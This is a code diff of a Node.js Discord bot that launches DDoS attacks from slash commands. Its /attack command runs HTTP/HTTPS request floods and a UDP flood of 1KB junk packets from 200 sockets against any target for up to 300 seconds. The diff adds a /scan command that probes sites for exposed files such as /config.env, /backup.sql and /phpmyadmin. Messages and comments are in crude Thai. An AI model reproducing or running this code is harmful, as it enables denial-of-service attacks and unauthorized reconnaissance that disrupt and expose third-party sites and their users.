@@ -1,15 +1,14 @@
 /**
  * ============================================================================
- * JEFF FUJI - ULTIMATE DISCORD STRESS BOT (L7 & L4 HYBRID ENGINE)
+ * JEFF FUJI - ULTIMATE HACKING & RECON DISCORD BOT v3
  * Developed under JARVIS x ARI Protocol
  * ============================================================================
  */
 
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
 const http = require('http');
 const https = require('https');
 const dgram = require('dgram');
-const net = require('net');
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
@@ -25,7 +24,7 @@ const client = new Client({
 let isAttacking = false;
 let attackTimers = [];
 
-// HTTP/HTTPS Agents สำหรับโหมด L7
+// Agents สำหรับยิง L7
 const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000 });
 const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 10000, maxFreeSockets: 5000, rejectUnauthorized: false });
 
@@ -35,14 +34,14 @@ client.once('ready', async () => {
     const commands = [
         new SlashCommandBuilder()
             .setName('attack')
-            .setDescription('ยิงถล่มเป้าหมาย (เลือกโหมดได้ L7 หรือ L4)')
+            .setDescription('ยิงถล่มเป้าหมาย (L7 HTTP หรือ L4 UDP Flood)')
             .addStringOption(option => 
                 option.setName('type')
                     .setDescription('เลือกโหมดการยิง')
                     .setRequired(true)
                     .addChoices(
                         { name: '🌐 L7 (HTTP/HTTPS Flood)', value: 'l7' },
-                        { name: '⚡ L4 (UDP/TCP Network Flood)', value: 'l4' }
+                        { name: '⚡ L4 (UDP Network Flood)', value: 'l4' }
                     ))
             .addStringOption(option => 
                 option.setName('target')
@@ -53,8 +52,15 @@ client.once('ready', async () => {
                     .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                     .setRequired(true)),
         new SlashCommandBuilder()
+            .setName('scan')
+            .setDescription('สแกนหาไฟล์ลับและช่องโหว่เบื้องต้นของเว็บไซต์ (Recon)')
+            .addStringOption(option => 
+                option.setName('url')
+                    .setDescription('URL เป้าหมาย (เช่น https://example.com)')
+                    .setRequired(true)),
+        new SlashCommandBuilder()
             .setName('stop')
-            .setDescription('หยุดการยิงทั้งหมดทันที')
+            .setDescription('หยุดการกระทำทั้งหมดทันที')
     ].map(command => command.toJSON());
 
     const rest = new REST({ version: '10' }).setToken(TOKEN);
@@ -79,14 +85,13 @@ client.on('interactionCreate', async interaction => {
         const duration = interaction.options.getInteger('duration');
 
         if (isAttacking) {
-            return interaction.reply({ content: '⚠️ กำลังมียุทธการยิงเป้าหมายอื่นอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
+            return interaction.reply({ content: '⚠️ กำลังมียุทธการอื่นทำงานอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
         }
 
         isAttacking = true;
         const endTime = Date.now() + (duration * 1000);
 
         if (attackType === 'l7') {
-            // ==================== L7 HTTP FLOOD ====================
             try {
                 const parsedUrl = new URL(target);
                 const requester = parsedUrl.protocol === 'https:' ? https : http;
@@ -128,7 +133,6 @@ client.on('interactionCreate', async interaction => {
             }
 
         } else if (attackType === 'l4') {
-            // ==================== L4 UDP/TCP FLOOD ====================
             const parts = target.split(':');
             if (parts.length !== 2) {
                 isAttacking = false;
@@ -140,7 +144,7 @@ client.on('interactionCreate', async interaction => {
 
             await interaction.reply(`🔥 **[L4 NETWORK FLOOD]** เริ่มระเบิดท่อใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);
 
-            const payload = Buffer.alloc(1024); // 1KB Payload ขยะ
+            const payload = Buffer.alloc(1024);
             for (let i = 0; i < 200; i++) {
                 const clientUdp = dgram.createSocket('udp4');
                 const sendUdp = () => {
@@ -148,7 +152,7 @@ client.on('interactionCreate', async interaction => {
                         clientUdp.close();
                         return;
                     }
-                    clientUdp.send(payload, port, host, (err) => {
+                    clientUdp.send(payload, port, host, () => {
                         setImmediate(sendUdp);
                     });
                 };
@@ -156,7 +160,6 @@ client.on('interactionCreate', async interaction => {
             }
         }
 
-        // ตั้งเวลาหยุดอัตโนมัติ
         const timer = setTimeout(() => {
             isAttacking = false;
             interaction.followUp(`✅ ภารกิจถล่ม **${target}** เสร็จสิ้นตามเวลาที่กำหนด!`).catch(() => {});
@@ -164,16 +167,65 @@ client.on('interactionCreate', async interaction => {
 
         attackTimers.push(timer);
 
+    } else if (commandName === 'scan') {
+        const targetUrl = interaction.options.getString('url');
+        await interaction.reply(`🔍 กำลังทำ Recon สแกนหาไฟล์ลับและช่องโหว่ของ **${targetUrl}** รอแป๊บไอ้สัส...`);
+
+        // รายการ path ยอดฮิตที่แอดมินชอบซ่อนไว้
+        const paths = ['/admin', '/login.php', '/config.env', '/backup.sql', '/phpmyadmin', '/robots.txt', '/wp-login.php', '/server-status'];
+        let foundResults = [];
+
+        try {
+            const parsedBase = new URL(targetUrl);
+            let checkedCount = 0;
+
+            paths.forEach((p) => {
+                const testUrl = `${parsedBase.protocol}//${parsedBase.host}${p}`;
+                const reqLib = parsedBase.protocol === 'https:' ? https : http;
+
+                const req = reqLib.get(testUrl, (res) => {
+                    checkedCount++;
+                    if (res.statusCode === 200 || res.statusCode === 403) {
+                        foundResults.push(`✅ พบจุดน่าสนใจ: \`${testUrl}\` (Status: ${res.statusCode})`);
+                    }
+                    if (checkedCount === paths.length) {
+                        sendScanResults();
+                    }
+                });
+
+                req.on('error', () => {
+                    checkedCount++;
+                    if (checkedCount === paths.length) {
+                        sendScanResults();
+                    }
+                });
+                req.end();
+            });
+
+            async function sendScanResults() {
+                const embed = new EmbedBuilder()
+                    .setTitle('🛡️ Recon & Vulnerability Report')
+                    .setColor(foundResults.length > 0 ? 0x22c55e : 0xef4444)
+                    .setDescription(foundResults.length > 0 ? foundResults.join('\n') : '❌ ไม่พบไฟล์ลับหรือจุดอ่อนในรายการทดสอบพื้นฐาน')
+                    .setTimestamp();
+
+                await interaction.followUp({ embeds: [embed] });
+            }
+
+        } catch (err) {
+            await interaction.followUp(`❌ URL ไม่ถูกต้อง: ${err.message}`);
+        }
+
     } else if (commandName === 'stop') {
         if (!isAttacking) {
-            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังยิงอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
+            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังทำงานอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
         }
 
         isAttacking = false;
         attackTimers.forEach(t => clearTimeout(t));
         attackTimers = [];
 
-        await interaction.reply('🛑 สั่งหยุดการยิงทั้งหมดเรียบร้อย!');
+        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
     }
 });
 
